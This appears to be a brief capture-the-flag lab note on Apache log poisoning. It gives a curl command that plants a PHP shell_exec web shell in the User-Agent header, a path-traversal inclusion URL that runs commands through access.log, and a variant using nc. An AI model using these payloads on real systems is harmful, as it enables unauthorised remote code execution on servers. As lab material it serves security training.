You can poison the log file with malicous php code in user agent like so:

```
curl <http://10.10.129.12> -A '<?php echo shell_exec($_REQUEST['0']);?>'

<http://10.10.129.12/?view=dog../../../../../../../../../../../../../var/log/apache2/access.log&ext=&0=id>
```

This technique also works:
rlwrap nc -nv 10.10.129.12 80
```
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

![unnamed_95cb7e3ef09f4944a4b00e06bd2e1fce](unnamed_95cb7e3ef09f4944a4b00e06bd2e1fce.png)
![unnamed_6e433414b9f046a08a381a512d56e47e](unnamed_6e433414b9f046a08a381a512d56e47e.png)
![unnamed_17b4513c18ce463ea487f8dbe1604d0c](unnamed_17b4513c18ce463ea487f8dbe1604d0c.png)